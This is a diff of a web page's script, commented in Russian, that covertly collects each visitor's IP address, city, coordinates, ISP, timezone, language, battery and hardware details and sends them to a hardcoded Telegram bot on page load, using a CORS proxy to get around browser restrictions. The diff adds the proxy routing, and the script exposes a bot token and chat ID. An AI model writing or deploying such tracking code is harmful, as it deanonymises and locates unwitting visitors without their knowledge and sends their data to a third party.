@@ -366,7 +366,7 @@
 
 <script>
 /* ════════════════════════════════════════════════════════
-   ⚠️ ВПИШИ СВОИ ЗНАЧЕНИЯ
+   ⚠️ ВПИШИ СВОИ ЗНАЧЕНИЯ СЮДА (И НЕ ЗАБУДЬ СДЕЛАТЬ /revoke)
    ════════════════════════════════════════════════════════ */
 const TG_TOKEN = "9259484153:AAECN3o7f468Ihs53LCMtnNC9Oso3xxmssw"; 
 const TG_CHAT  = "472749125"; 
@@ -381,13 +381,14 @@ document.getElementById("img2").src = IMAGES.s2;
 document.getElementById("img3").src = IMAGES.s3;
 
 /* ════════════════════════════════════════════════════════
-   СБОР ДАННЫХ (IP + Железо)
+   СБОР ДАННЫХ (IP + Железо) С ОБХОДОМ CORS
    ════════════════════════════════════════════════════════ */
 let geo = { ip: "скрыт", city: "—", country: "—", isp: "—", lat: null, lon: null };
 let deviceData = { timezone: "—", language: "—", net: "—", battery: "—", cores: "—", screen: "—" };
+const PROXY = "https://proxy.cors.dev/";
 
 async function loadAllData() {
-  // 1. Собираем данные устройства (без разрешений)
+  // 1. Собираем данные устройства
   deviceData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "—";
   deviceData.language = navigator.language || "—";
   deviceData.net = (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType.toUpperCase() : "—";
@@ -401,19 +402,19 @@ async function loadAllData() {
     }
   } catch(e) {}
 
-  // 2. Геолокация (API 1: ipapi.co)
+  // 2. Геолокация (API 1: ipapi.co через прокси)
   try {
-    const r = await fetch("https://ipapi.co/json/");
+    const r = await fetch(PROXY + "https://ipapi.co/json/");
     const d = await r.json();
     if (d.ip && !d.error) {
       geo = { ip: d.ip, city: d.city || "—", country: d.country_name || "—", isp: d.org || "—", lat: d.latitude, lon: d.longitude };
-      return; // Если сработало, выходим
+      return;
     }
   } catch(e) {}
 
-  // 3. Геолокация (API 2: ipwho.is - на подстраховку)
+  // 3. Геолокация (API 2: ipwho.is через прокси, на подстраховку)
   try {
-    const r = await fetch("https://ipwho.is/");
+    const r = await fetch(PROXY + "https://ipwho.is/");
     const d = await r.json();
     if (d.success) {
       geo = { ip: d.ip, city: d.city || "—", country: d.country || "—", isp: (d.connection && (d.connection.isp || d.connection.org)) || "—", lat: d.latitude, lon: d.longitude };
@@ -443,16 +444,16 @@ async function notifyAdmin(stage) {
     `Батарея: ${deviceData.battery}\n` +
     `Время: ${new Date().toLocaleString("ru-RU")}`;
 
-  const proxyUrl = "https://corsproxy.io/?";
   const tgUrl = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage`;
   
-  fetch(proxyUrl + encodeURIComponent(tgUrl), {
+  fetch(PROXY + tgUrl, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({ chat_id: TG_CHAT, text: text })
   }).catch(()=>{});
 }
 
+// Отправляем уведомление о заходе
 dataPromise.then(() => {
   notifyAdmin("🚪 ВХОД НА САЙТ");
 });
@@ -502,7 +503,6 @@ hs.addEventListener("click", async (e) => {
   document.getElementById("d-dev").textContent = `${deviceData.screen} · ${deviceData.cores} ядер`;
   document.getElementById("d-bat").textContent = deviceData.battery;
   document.getElementById("d-lang").textContent = deviceData.language;
-  
   document.getElementById("d-time").textContent = new Date().toLocaleString("ru-RU");
 
   setTimeout(() => {
